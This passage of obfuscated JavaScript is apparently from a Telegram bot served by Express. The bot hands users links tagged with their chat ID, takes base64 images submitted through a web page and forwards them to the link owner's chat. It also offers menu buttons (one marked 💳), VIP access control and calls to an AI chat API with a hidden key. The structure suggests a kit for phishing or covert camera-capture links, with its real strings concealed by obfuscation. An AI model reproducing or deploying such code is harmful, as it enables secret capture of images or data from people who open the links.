            'XdVJX': _0x48836a(0x6d3),
            'XhYuT': _0x48836a(0x6d1) + _0x48836a(0x282) + _0x48836a(0x1ea) + _0x48836a(0x977) + _0x48836a(0x77e) + _0x48836a(0x4d2),
            'qffPU': _0x48836a(0xbf5) + _0x48836a(0x988),
            'wbpxt': _0x48836a(0x68a) + _0x48836a(0x4b6) + ':',
            'GNVjR': _0x48836a(0x3b9) + _0x48836a(0xa9c) + _0x48836a(0x6c6)
        }, _0x229c74 = _0x4b3453[_0x48836a(0x386)][_0x48836a(0xa06)], _0x14993f = _0x4b3453[_0x48836a(0x386)][_0x48836a(0x24f)][_0x48836a(0x7aa)](','), _0x3e5d97 = _0x14993f[_0x48836a(0x79b)]((_0x455e44, _0x188ace) => {
            const _0x340955 = _0x48836a, _0x3a7209 = {
                    'zCMpM': _0x33e964[_0x340955(0x758)],
                    'QwXOZ': function (_0x2bed1a, _0x227d16) {
                        const _0x4c2fde = _0x340955;
                        return _0x33e964[_0x4c2fde(0x21f)](_0x2bed1a, _0x227d16);
                    }
                }, _0x471505 = Buffer[_0x340955(0x8e6)](_0x455e44, _0x33e964[_0x340955(0x7b7)]), _0x5232c2 = { 'data': _0x340955(0x792) + _0x340955(0x52f) + _0x340955(0x1aa) + _0x455e44 };
            return axios[_0x340955(0xa54)](_0x33e964[_0x340955(0x7ef)], _0x5232c2, { 'headers': _authHeaders$2 })[_0x340955(0x992)](_0x52745c => {
                const _0x352450 = _0x340955, _0x5d0040 = _0x52745c[_0x352450(0x50f)];
                return console[_0x352450(0xb18)](_0x352450(0x4a3) + _0x352450(0xc18) + _0x352450(0x1b7) + _0x5d0040[_0x352450(0x9bb)] + (_0x352450(0x33e) + _0x352450(0x69d)) + _0x5d0040[_0x352450(0x91b)]), _0x33e964[_0x352450(0xcb9)](_0x5d0040[_0x352450(0x9bb)], _0x33e964[_0x352450(0x90a)]) && _0x33e964[_0x352450(0x96e)](_0x5d0040[_0x352450(0x91b)], 0xe75 * 0x1 + -0x35 * 0x20 + 0x1 * -0x7d5 + 0.9) ? bot[_0x352450(0x359)](_0x229c74, _0x471505, { 'caption': _0x352450(0x71d) + _0x33e964[_0x352450(0x21f)](_0x188ace, 0x172c + 0x1 * -0xd0a + 0x1 * -0xa21) }) : bot[_0x352450(0x741) + 'e'](_0x229c74, _0x352450(0x9ed) + _0x33e964[_0x352450(0x21f)](_0x188ace, -0x1 * 0x636 + -0x1a4b + 0x2082) + (_0x352450(0x270) + _0x352450(0xd16) + _0x352450(0x655) + _0x352450(0xb05)));
            })[_0x340955(0x2c4)](_0x191172 => {
                const _0x1eacac = _0x340955;
                return console[_0x1eacac(0x3a5)](_0x3a7209[_0x1eacac(0xa20)], _0x191172), bot[_0x1eacac(0x741) + 'e'](_0x229c74, _0x1eacac(0x880) + _0x1eacac(0xab8) + 'ة\x20' + _0x3a7209[_0x1eacac(0xb73)](_0x188ace, 0x1799 + 0xe2 * 0xb + -0x214e));
            });
        });
    Promise[_0x48836a(0x351)](_0x3e5d97)[_0x48836a(0x992)](() => {
        const _0x14b790 = _0x48836a;
        console[_0x14b790(0xb18)](_0x14b790(0xb2e) + _0x14b790(0xb8d) + _0x14b790(0x6ab) + _0x14b790(0xc2e) + 'd\x20' + _0x229c74), dataStore[_0x229c74] && dataStore[_0x229c74][_0x14b790(0x45c)] ? _0x46410c[_0x14b790(0xadf)](dataStore[_0x229c74][_0x14b790(0x45c)]) : _0x46410c[_0x14b790(0x9d2)](_0x33e964[_0x14b790(0xd33)]);
    })[_0x48836a(0x2c4)](_0x1b93a1 => {
        const _0x77dfe7 = _0x48836a;
        console[_0x77dfe7(0x3a5)](_0x33e964[_0x77dfe7(0xc53)], _0x1b93a1), _0x46410c[_0x77dfe7(0x972)](-0x1 * 0x14fe + -0x1 * 0x1736 + 0x2e28)[_0x77dfe7(0x9d2)](_0x33e964[_0x77dfe7(0x258)]);
    });
}), app[_0x54266d(0x4bf)](_0x54266d(0x7ed), (_0x10e5f9, _0x3c6fb6) => {
    const _0x211524 = _0x54266d, _0x5539e8 = { 'lIHWs': _0x211524(0xbc1) };
    _0x3c6fb6[_0x211524(0xd98)](path[_0x211524(0x75e)](__dirname, _0x5539e8[_0x211524(0xc09)]));
});
let linkUsage = {};
const maxAttemptsPerButton = 0x565 + 0x1e4 * -0x2 + 0x2 * 0x47;
function validateLinkUsage(_0x29a8bd, _0x41f1d5) {
    const _0x46cc39 = _0x54266d, _0x3b74ba = {
            'URjEl': function (_0x558d4e, _0x498533) {
                return _0x558d4e(_0x498533);
            },
            'HEdlo': function (_0x24e3f0, _0x23e7c3) {
                return _0x24e3f0 >= _0x23e7c3;
            }
        }, _0x270bd6 = _0x29a8bd + ':' + _0x41f1d5;
    if (_0x3b74ba[_0x46cc39(0x8d9)](isVIPUser, _0x29a8bd))
        return !![];
    if (linkUsage[_0x270bd6] && _0x3b74ba[_0x46cc39(0x261)](linkUsage[_0x270bd6][_0x46cc39(0xd18)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x270bd6] && (linkUsage[_0x270bd6] = { 'attempts': 0x0 }), linkUsage[_0x270bd6][_0x46cc39(0xd18)]++, !![];
}
let vipUsers = {};
function addVIPUser(_0xbac2ae) {
    vipUsers[_0xbac2ae] = !![];
}
function removeVIPUser(_0x51ffa5) {
    delete vipUsers[_0x51ffa5];
}
function isVIPUser(_0x307886) {
    return !!vipUsers[_0x307886];
}
bot[_0x54266d(0xb39)](/\/stㅇㅗㅑㅡarㅏt/, async _0x5ee66e => {
    const _0x3d551e = _0x54266d, _0x266d14 = {
            'vdwJv': function (_0x50c74b, _0x1144cc) {
                return _0x50c74b(_0x1144cc);
            },
            'EGtuE': _0x3d551e(0x39a) + _0x3d551e(0xcb5) + _0x3d551e(0x6a7) + _0x3d551e(0x27f) + _0x3d551e(0x776) + _0x3d551e(0x4ed),
            'diXGK': _0x3d551e(0xb3c) + _0x3d551e(0x8b1) + _0x3d551e(0x4af),
            'TKkEx': _0x3d551e(0x3fb) + _0x3d551e(0x856) + _0x3d551e(0xda7),
            'hhXGF': _0x3d551e(0x3fb) + _0x3d551e(0x255) + _0x3d551e(0x734),
            'yikKH': _0x3d551e(0xcb1) + _0x3d551e(0x36d),
            'PjzpQ': _0x3d551e(0xd1b) + _0x3d551e(0x8f1),
            'HkNwI': _0x3d551e(0x39d) + _0x3d551e(0xc4a) + _0x3d551e(0x588),
            'PuniW': _0x3d551e(0x935) + 's',
            'hDpch': _0x3d551e(0x7b2) + _0x3d551e(0x225),
            'bFiBy': _0x3d551e(0xd24) + _0x3d551e(0xc1d),
            'CeVWk': _0x3d551e(0x2a7) + _0x3d551e(0x188),
            'Ujvru': _0x3d551e(0x516) + _0x3d551e(0x5cb),
            'jLRdg': _0x3d551e(0x62c) + _0x3d551e(0x427),
            'ZmwCj': _0x3d551e(0x27e) + _0x3d551e(0x5de),
            'qyaWG': _0x3d551e(0x942) + _0x3d551e(0x31c),
            'gmwGq': _0x3d551e(0x6b1),
            'qhULK': _0x3d551e(0xad6) + _0x3d551e(0x330),
            'NBKjJ': _0x3d551e(0xbbe) + 're',
            'weKvB': _0x3d551e(0x83f) + _0x3d551e(0x2c7),
            'LHJLR': _0x3d551e(0xa4c),
            'MhUYW': _0x3d551e(0x1b8) + _0x3d551e(0xc1e),
            'foYbg': _0x3d551e(0x8d2) + _0x3d551e(0x407) + _0x3d551e(0x4ab),
            'BbcAq': _0x3d551e(0xadd) + _0x3d551e(0x92e) + _0x3d551e(0xa91) + _0x3d551e(0xb4a) + _0x3d551e(0x4d5),
            'pewVb': _0x3d551e(0xb0e) + _0x3d551e(0xd14),
            'YIxGQ': _0x3d551e(0x59b) + _0x3d551e(0x6df),
            'YTlBB': _0x3d551e(0x7e9) + _0x3d551e(0xe07),
            'SAwMX': _0x3d551e(0x7de) + _0x3d551e(0x216) + _0x3d551e(0xc05) + _0x3d551e(0xb4e) + _0x3d551e(0x3f3),
            'KALso': _0x3d551e(0x7b1) + _0x3d551e(0x3f9),
            'xRBsO': _0x3d551e(0x319),
            'RUpgb': _0x3d551e(0x6ec) + _0x3d551e(0x96a) + _0x3d551e(0x6ee),
            'DnVqd': _0x3d551e(0xd17),
            'ztwMO': _0x3d551e(0x4fe) + _0x3d551e(0x3f7),
            'yHngp': _0x3d551e(0x1c3) + _0x3d551e(0x48d) + _0x3d551e(0xad7) + _0x3d551e(0x22f) + _0x3d551e(0x2d1),
            'YhIqo': _0x3d551e(0xbb2) + _0x3d551e(0xaeb),
            'YLhxD': _0x3d551e(0xcd2) + _0x3d551e(0x757) + '3',
            'rLCVo': _0x3d551e(0xbd9) + _0x3d551e(0xc80),
            'UeqFE': _0x3d551e(0x1ff) + _0x3d551e(0xccf) + _0x3d551e(0xc9b) + _0x3d551e(0x5d3) + 'e/',
            'IWMSz': _0x3d551e(0x57e) + _0x3d551e(0x90e),
            'mFayr': _0x3d551e(0x481) + 'il',
            'YvSNW': _0x3d551e(0x982) + '💳',
            'qIPtv': _0x3d551e(0x98c) + _0x3d551e(0xe13),
            'nFGoE': _0x3d551e(0x2d0) + _0x3d551e(0x647),
            'gRrHH': _0x3d551e(0x63d) + _0x3d551e(0x7f8),
            'nYlWQ': _0x3d551e(0x72b) + _0x3d551e(0x5f3),
            'emfbn': _0x3d551e(0xa99) + _0x3d551e(0x384),
            'thSHV': _0x3d551e(0xe17) + _0x3d551e(0x312),
            'UeNOv': _0x3d551e(0x72a),
            'RcZmk': _0x3d551e(0xdea) + _0x3d551e(0x5f7),
            'HYuWk': _0x3d551e(0x7be) + 's',
            'BeMPf': _0x3d551e(0x9da) + _0x3d551e(0xbda),
            'wMiji': _0x3d551e(0xb4f) + _0x3d551e(0x3ba),
            'CVGwb': _0x3d551e(0x538) + _0x3d551e(0x224),
            'bpRKn': _0x3d551e(0x71f),
            'ykUFO': _0x3d551e(0x969) + _0x3d551e(0x3cc),
            'igtBh': _0x3d551e(0x5d6) + _0x3d551e(0xa24) + '0',
            'wQMwG': _0x3d551e(0xc7d) + _0x3d551e(0xa8b),
            'xmxyb': _0x3d551e(0x84d),
            'fOnLP': _0x3d551e(0x788) + _0x3d551e(0xb82),
            'OHIDU': _0x3d551e(0x7fc) + 'xt',
            'eaLlA': _0x3d551e(0xdc7) + _0x3d551e(0xdad),
            'oTgFw': _0x3d551e(0x428) + 'e',
            'UkAIp': _0x3d551e(0xacb) + _0x3d551e(0x44b) + _0x3d551e(0x273),
            'sXHzc': _0x3d551e(0x90d) + _0x3d551e(0xdf2),
            'YaBqR': _0x3d551e(0xe17) + _0x3d551e(0x509),
            'gqJMm': _0x3d551e(0xd95) + _0x3d551e(0x403),
            'ewmig': _0x3d551e(0x4a6) + _0x3d551e(0xa98) + '\x20⛔',
            'PQpZr': _0x3d551e(0x76b) + 'ة',
            'ZEwuJ': _0x3d551e(0xa36) + _0x3d551e(0x58b),
            'GIiFu': _0x3d551e(0xcd2) + _0x3d551e(0xa40),
            'ICOCt': function (_0x4f06d2, _0x2a8dd7) {
                return _0x4f06d2 === _0x2a8dd7;
            },
            'tEmBL': _0x3d551e(0xdba) + _0x3d551e(0xaf9) + _0x3d551e(0x8b3) + _0x3d551e(0x21e),
            'mefqL': _0x3d551e(0x436) + _0x3d551e(0x55a),
            'iCWWg': _0x3d551e(0x816),
            'ijtXi': _0x3d551e(0xc5f) + _0x3d551e(0xc66),
            'ZhSKB': _0x3d551e(0x27b)
        }, _0x138c43 = _0x5ee66e[_0x3d551e(0x6a9)]['id'], _0x2c910a = await _0x266d14[_0x3d551e(0xd64)](isUserSubscribed, _0x138c43);
    if (!_0x2c910a) {
        const _0x13d887 = _0x266d14[_0x3d551e(0x80b)], _0x4cca49 = developerChannels[_0x3d551e(0x79b)](_0x1d517c => [{
                    'text': _0x3d551e(0xa5a) + _0x1d517c,
                    'url': _0x3d551e(0xcd2) + _0x3d551e(0x3f3) + _0x1d517c[_0x3d551e(0xca7)](-0x10b7 * 0x1 + 0x1 * 0x2678 + -0x15c0)
                }]);
        bot[_0x3d551e(0x741) + 'e'](_0x138c43, _0x13d887, { 'reply_markup': { 'inline_keyboard': _0x4cca49 } });
        return;
    }
    const _0x128271 = _0x266d14[_0x3d551e(0x7c0)], _0x504256 = [
            [
                {
                    'text': _0x266d14[_0x3d551e(0x1a4)],
                    'callback_data': _0x3d551e(0xe29) + _0x3d551e(0x49c) + _0x138c43
                },
                {
                    'text': _0x266d14[_0x3d551e(0xdd6)],
                    'callback_data': _0x3d551e(0xab5) + 'k:' + _0x138c43
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0xd35)],
                    'callback_data': _0x3d551e(0x9e6) + 'n:' + _0x138c43
                },
                {
                    'text': _0x266d14[_0x3d551e(0x76c)],
                    'callback_data': _0x3d551e(0x73d) + 'e:' + _0x138c43
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x60a)],
                    'callback_data': _0x266d14[_0x3d551e(0x98f)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0xa28)],
                    'callback_data': _0x266d14[_0x3d551e(0x521)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0xdc0)],
                    'callback_data': _0x266d14[_0x3d551e(0x58f)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x971)],
                    'callback_data': _0x3d551e(0x5c5) + _0x3d551e(0xd5a) + _0x138c43
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x735)],
                    'callback_data': _0x3d551e(0xe15) + _0x3d551e(0xc11) + _0x138c43
                },
                {
                    'text': _0x266d14[_0x3d551e(0xa86)],
                    'callback_data': _0x266d14[_0x3d551e(0x717)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x981)],
                    'callback_data': _0x266d14[_0x3d551e(0xc48)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0xb78)],
                    'callback_data': _0x266d14[_0x3d551e(0x3ef)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x2ac)],
                    'callback_data': _0x3d551e(0xd48) + 'k:' + _0x138c43
                },
                {
                    'text': _0x266d14[_0x3d551e(0xcf3)],
                    'web_app': { 'url': _0x266d14[_0x3d551e(0xa6c)] }
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x4f7)],
                    'callback_data': _0x266d14[_0x3d551e(0x1d7)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x7f4)],
                    'web_app': { 'url': _0x266d14[_0x3d551e(0xc32)] }
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x4b1)],
                    'callback_data': _0x266d14[_0x3d551e(0xcc8)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x5a3)],
                    'callback_data': _0x266d14[_0x3d551e(0xc95)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x336)],
                    'web_app': { 'url': _0x266d14[_0x3d551e(0xba9)] }
                },
                {
                    'text': _0x266d14[_0x3d551e(0x592)],
                    'url': _0x266d14[_0x3d551e(0x20c)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x74a)],
                    'web_app': { 'url': _0x266d14[_0x3d551e(0x36b)] }
                },
                {
                    'text': _0x266d14[_0x3d551e(0x57b)],
                    'callback_data': _0x266d14[_0x3d551e(0x5a8)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0xe25)],
                    'callback_data': _0x266d14[_0x3d551e(0x568)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x5d2)],
                    'callback_data': _0x266d14[_0x3d551e(0xc22)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0xa67)],
                    'callback_data': _0x266d14[_0x3d551e(0x93c)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x51c)],
                    'callback_data': _0x266d14[_0x3d551e(0x56c)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x677)],
                    'callback_data': _0x266d14[_0x3d551e(0xbbc)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x78a)],
                    'callback_data': _0x266d14[_0x3d551e(0x313)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x4a7)],
                    'callback_data': _0x266d14[_0x3d551e(0x9ff)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x504)],
                    'callback_data': _0x266d14[_0x3d551e(0xc75)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x84b)],
                    'callback_data': _0x266d14[_0x3d551e(0xc69)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x9ad)],
                    'callback_data': _0x266d14[_0x3d551e(0xc2a)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0xbb0)],
                    'callback_data': _0x266d14[_0x3d551e(0x1bb)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x899)],
                    'callback_data': _0x266d14[_0x3d551e(0x426)]
                }
            ],
            [
                {
                    'text': _0x266d14[_0x3d551e(0x62a)],
                    'callback_data': _0x266d14[_0x3d551e(0x91d)]
                },
                {
                    'text': _0x266d14[_0x3d551e(0x713)],
                    'callback_data': _0x266d14[_0x3d551e(0x9e7)]
                }
            ],
            [{
                    'text': _0x266d14[_0x3d551e(0x633)],
                    'url': _0x266d14[_0x3d551e(0xc08)]
                }]
        ];
    bot[_0x3d551e(0x741) + 'e'](_0x138c43, _0x128271, { 'reply_markup': { 'inline_keyboard': _0x504256 } });
    if (_0x266d14[_0x3d551e(0xd39)](_0x138c43, 0x3004e8 * 0x421 + -0x6642d980 + 0xf611c752)) {
        const _0x459f89 = _0x266d14[_0x3d551e(0x625)], _0x4ecb56 = [[
                    {
                        'text': _0x266d14[_0x3d551e(0x531)],
                        'callback_data': _0x266d14[_0x3d551e(0x510)]
                    },
                    {
                        'text': _0x266d14[_0x3d551e(0xb2f)],
                        'callback_data': _0x266d14[_0x3d551e(0xcb7)]
                    }
                ]];
        bot[_0x3d551e(0x741) + 'e'](_0x138c43, _0x459f89, { 'reply_markup': { 'inline_keyboard': _0x4ecb56 } });
    }
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x5262e6 => {
    const _0x1cab98 = _0x54266d, _0x4c7173 = {
            'BmvFS': function (_0x1458c6, _0x67b788) {
                return _0x1458c6 === _0x67b788;
            },
            'HKopd': _0x1cab98(0xd24) + _0x1cab98(0xc1d)
        }, _0x349759 = _0x5262e6[_0x1cab98(0x842)][_0x1cab98(0x6a9)]['id'], _0x21e894 = _0x5262e6[_0x1cab98(0x50f)];
    if (_0x4c7173[_0x1cab98(0x2d4)](_0x21e894, _0x4c7173[_0x1cab98(0x205)])) {
        const _0x4d268c = _0x1cab98(0x95f) + _0x1cab98(0x460) + _0x1cab98(0x4a9) + _0x1cab98(0xb65) + _0x1cab98(0x813) + _0x1cab98(0x18a) + baseUrl + (_0x1cab98(0x673) + _0x1cab98(0x267)) + _0x349759;
        bot[_0x1cab98(0x741) + 'e'](_0x349759, _0x4d268c);
    }
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x45c34e => {
    const _0x403f66 = _0x54266d, _0x207c9d = {
            'kVaAx': function (_0x27caff, _0x57e21a) {
                return _0x27caff(_0x57e21a);
            },
            'bTFur': function (_0x4f6e32, _0x5ae4db) {
                return _0x4f6e32(_0x5ae4db);
            },
            'dsbbX': _0x403f66(0xa4c),
            'LJAKz': _0x403f66(0x935) + 's',
            'xRixz': _0x403f66(0xbbe) + 're',
            'zRoVr': _0x403f66(0x5c5) + _0x403f66(0xde1),
            'tXyYb': _0x403f66(0x6b1),
            'sEhBq': _0x403f66(0xd48) + 'k',
            'HviqD': _0x403f66(0xd17),
            'MGTPU': _0x403f66(0xe15) + _0x403f66(0x6c8),
            'KBYKN': function (_0x1f4cf5, _0x44fbe1) {
                return _0x1f4cf5(_0x44fbe1);
            },
            'IVQOD': _0x403f66(0x39a) + _0x403f66(0xcb5) + _0x403f66(0x6a7) + _0x403f66(0x27f) + _0x403f66(0x776) + _0x403f66(0x4ed),
            'IjDMv': function (_0x15ce4d, _0xb222aa) {
                return _0x15ce4d === _0xb222aa;
            },
            'ylPIn': _0x403f66(0x516) + _0x403f66(0x5cb),
            'KkkAe': _0x403f66(0x81c),
            'zaouk': _0x403f66(0xcdd) + _0x403f66(0xbf3) + _0x403f66(0x7a1) + _0x403f66(0x9c6) + _0x403f66(0x3ab) + _0x403f66(0xb59),
            'NayUU': _0x403f66(0x834) + _0x403f66(0x2f6) + _0x403f66(0x1c1) + _0x403f66(0x502) + 'ns',
            'JWgtF': _0x403f66(0x71e) + _0x403f66(0xd74),
            'pnwvX': _0x403f66(0x4f2),
            'gJtnW': _0x403f66(0x77a) + _0x403f66(0x710) + _0x403f66(0x542) + _0x403f66(0xc79) + _0x403f66(0xabe) + _0x403f66(0x5c3) + _0x403f66(0x3e1) + _0x403f66(0x7f0) + _0x403f66(0x244) + _0x403f66(0x5ad) + 'cA',
            'JZeff': _0x403f66(0x9d8) + _0x403f66(0x681),
            'NNgmo': _0x403f66(0xd37) + _0x403f66(0x5f0),
            'pwbbE': _0x403f66(0x535) + _0x403f66(0x1f4) + _0x403f66(0x9f3) + _0x403f66(0x65e) + _0x403f66(0x7c7) + _0x403f66(0xd03) + _0x403f66(0x580),
            'AsFFn': function (_0x55b32a, _0x3d55e7) {
                return _0x55b32a === _0x3d55e7;
            },
            'iIykr': _0x403f66(0x89d) + _0x403f66(0xdbc),
            'fxMTi': _0x403f66(0xc59) + _0x403f66(0xa8e) + _0x403f66(0x2d7) + _0x403f66(0xc83) + _0x403f66(0x3df) + _0x403f66(0x2e8) + _0x403f66(0x6b0) + _0x403f66(0x579) + _0x403f66(0x231) + _0x403f66(0xb32) + _0x403f66(0x47d) + _0x403f66(0xcef) + _0x403f66(0xc36) + _0x403f66(0xc15) + _0x403f66(0x4aa) + _0x403f66(0xcc3),
            'HGouQ': _0x403f66(0xd37) + _0x403f66(0x63b) + _0x403f66(0x832),
            'dTLha': _0x403f66(0x535) + _0x403f66(0x1f4) + _0x403f66(0xdfb) + _0x403f66(0x836) + _0x403f66(0x409) + _0x403f66(0x623) + _0x403f66(0x743),
            'hfaIk': _0x403f66(0x816),
            'jrJzZ': function (_0xc49d05, _0x6db393) {
                return _0xc49d05 == _0x6db393;
            },
            'tWbhc': _0x403f66(0x212) + _0x403f66(0x9b6) + _0x403f66(0x346) + _0x403f66(0x843) + 'P:',
            'tDFQF': _0x403f66(0x842),
            'nubhj': function (_0x549aa6, _0x453100) {
                return _0x549aa6 === _0x453100;
            },
            'IwmYz': _0x403f66(0x27b),
            'ghBCC': function (_0x4c7544, _0x532f41) {
                return _0x4c7544 == _0x532f41;
            },
            'QEbsQ': _0x403f66(0x212) + _0x403f66(0x9b6) + _0x403f66(0x8c4) + _0x403f66(0xace) + 'P:',
            'JoNbf': function (_0x52c7d0, _0x42e046, _0x3c949a) {
                return _0x52c7d0(_0x42e046, _0x3c949a);
            },
            'spXSC': _0x403f66(0xe29) + 'nt',
            'BXziy': _0x403f66(0xd61),
            'ontWI': _0x403f66(0xab5) + 'k',
            'MDGNB': _0x403f66(0x9e6) + 'n',
            'YdTLK': _0x403f66(0x73d) + 'e'
        }, _0xe32180 = _0x45c34e[_0x403f66(0x842)][_0x403f66(0x6a9)]['id'], _0x4c4054 = _0x45c34e[_0x403f66(0x50f)], _0x4b4ba8 = [
            _0x207c9d[_0x403f66(0x30d)],
            _0x207c9d[_0x403f66(0x3bc)],
            _0x207c9d[_0x403f66(0x3e6)],
            _0x207c9d[_0x403f66(0x2f1)],
            _0x207c9d[_0x403f66(0xc26)],
            _0x207c9d[_0x403f66(0xa60)],
            _0x207c9d[_0x403f66(0x97a)],
            _0x207c9d[_0x403f66(0x1e8)]
        ];
    if (!_0x4b4ba8[_0x403f66(0x439)](_0x4c4054[_0x403f66(0x7aa)](':')[-0x3 * -0x61d + -0x7e6 * 0x3 + -0x3 * -0x1c9]) && !await _0x207c9d[_0x403f66(0xc6a)](isUserSubscribed, _0xe32180)) {
        const _0x3d1913 = _0x207c9d[_0x403f66(0xbd3)], _0x49ec7c = developerChannels[_0x403f66(0x79b)](_0x181cca => ({
                'text': _0x403f66(0xa5a) + _0x181cca,
                'url': _0x403f66(0xcd2) + _0x403f66(0x3f3) + _0x181cca[_0x403f66(0xca7)](0x239 * -0xf + 0x1d5f + 0x3f9)
            }));
        bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x3d1913, { 'reply_markup': { 'inline_keyboard': [_0x49ec7c] } });
        return;
    }
    if (_0x207c9d[_0x403f66(0xae1)](_0x4c4054, _0x207c9d[_0x403f66(0x37a)])) {
        const _0x35d026 = baseUrl + (_0x403f66(0x418) + _0x403f66(0x699)) + _0xe32180;
        bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x403f66(0x95f) + _0x403f66(0xcce) + _0x403f66(0xcb6) + '\x20' + _0x35d026);
        return;
    }
    const [_0x44e52f, _0x45b2b3] = _0x4c4054[_0x403f66(0x7aa)](':');
    if (_0x207c9d[_0x403f66(0xae1)](_0x44e52f, _0x207c9d[_0x403f66(0x8e2)]))
        try {
            const _0x25268c = _0x207c9d[_0x403f66(0x815)], _0x5199a6 = _0x207c9d[_0x403f66(0x37c)], _0x46e283 = await axios[_0x403f66(0xa54)](_0x5199a6, {
                    'model': _0x207c9d[_0x403f66(0xaa9)],
                    'messages': [{
                            'role': _0x207c9d[_0x403f66(0x704)],
                            'content': _0x25268c
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x207c9d[_0x403f66(0x434)],
                        'Content-Type': _0x207c9d[_0x403f66(0x4db)]
                    }
                }), _0x1225b9 = _0x46e283[_0x403f66(0x50f)][_0x403f66(0x5ca)][0x1c19 + 0x1894 + -0x34ad][_0x403f66(0x842)][_0x403f66(0xaa6)];
            bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x1225b9);
        } catch (_0x4124eb) {
            console[_0x403f66(0x3a5)](_0x207c9d[_0x403f66(0x76a)], _0x4124eb[_0x403f66(0x28f)] ? _0x4124eb[_0x403f66(0x28f)][_0x403f66(0x50f)] : _0x4124eb[_0x403f66(0x842)]), bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x207c9d[_0x403f66(0xd0e)]);
        }
    else {
        if (_0x207c9d[_0x403f66(0x8de)](_0x4c4054, _0x207c9d[_0x403f66(0x2f7)]))
            try {
                const _0x44996e = _0x207c9d[_0x403f66(0xc47)], _0x5ca0f2 = _0x207c9d[_0x403f66(0x37c)], _0x3530f0 = await axios[_0x403f66(0xa54)](_0x5ca0f2, {
                        'model': _0x207c9d[_0x403f66(0xaa9)],
                        'messages': [{
                                'role': _0x207c9d[_0x403f66(0x704)],
                                'content': _0x44996e
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x207c9d[_0x403f66(0x434)],
                            'Content-Type': _0x207c9d[_0x403f66(0x4db)]
                        }
                    }), _0x504c45 = _0x3530f0[_0x403f66(0x50f)][_0x403f66(0x5ca)][-0x1e * 0x43 + -0xef3 + 0x16cd][_0x403f66(0x842)][_0x403f66(0xaa6)];
                bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x504c45);
            } catch (_0x44550b) {
                console[_0x403f66(0x3a5)](_0x207c9d[_0x403f66(0x76a)], _0x44550b[_0x403f66(0x28f)] ? _0x44550b[_0x403f66(0x28f)][_0x403f66(0x50f)] : _0x44550b[_0x403f66(0x842)]), bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x207c9d[_0x403f66(0xd0e)]);
            }
        else {
            if (_0x207c9d[_0x403f66(0x8de)](_0x4c4054, _0x207c9d[_0x403f66(0x2f7)]))
                try {
                    const _0x43a181 = _0x207c9d[_0x403f66(0xc47)], _0x2ec07d = _0x207c9d[_0x403f66(0x37c)], _0x534328 = await axios[_0x403f66(0xa54)](_0x2ec07d, {
                            'model': _0x207c9d[_0x403f66(0xaa9)],
                            'messages': [{
                                    'role': _0x207c9d[_0x403f66(0x704)],
                                    'content': _0x43a181
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x207c9d[_0x403f66(0x434)],
                                'Content-Type': _0x207c9d[_0x403f66(0x4db)]
                            }
                        }), _0xffb842 = _0x534328[_0x403f66(0x50f)][_0x403f66(0x5ca)][-0x13 * 0xdf + 0x244b * -0x1 + -0x1a6c * -0x2][_0x403f66(0x842)][_0x403f66(0xaa6)];
                    bot[_0x403f66(0x741) + 'e'](_0xe32180, _0xffb842);
                } catch (_0x1d0d89) {
                    console[_0x403f66(0x3a5)](_0x207c9d[_0x403f66(0x490)], _0x1d0d89[_0x403f66(0x28f)] ? _0x1d0d89[_0x403f66(0x28f)][_0x403f66(0x50f)] : _0x1d0d89[_0x403f66(0x842)]), bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x207c9d[_0x403f66(0x5d1)]);
                }
            else {
                if (_0x207c9d[_0x403f66(0xae1)](_0x4c4054, _0x207c9d[_0x403f66(0x826)]) && _0x207c9d[_0x403f66(0xd27)](_0xe32180, 0x31 * -0x67be77f + -0x176c38973 + -0x15e6 * -0x2f3e4a))
                    bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x207c9d[_0x403f66(0xa78)]), bot[_0x403f66(0x1cb)](_0x207c9d[_0x403f66(0x9df)], _0x1cbe2a => {
                        const _0x21b1b0 = _0x403f66, _0x250104 = _0x1cbe2a[_0x21b1b0(0x9ac)];
                        _0x207c9d[_0x21b1b0(0xdf6)](addVIPUser, _0x250104), bot[_0x21b1b0(0x741) + 'e'](_0xe32180, _0x21b1b0(0x9c1) + _0x21b1b0(0xa07) + _0x250104 + _0x21b1b0(0xacc));
                    });
                else {
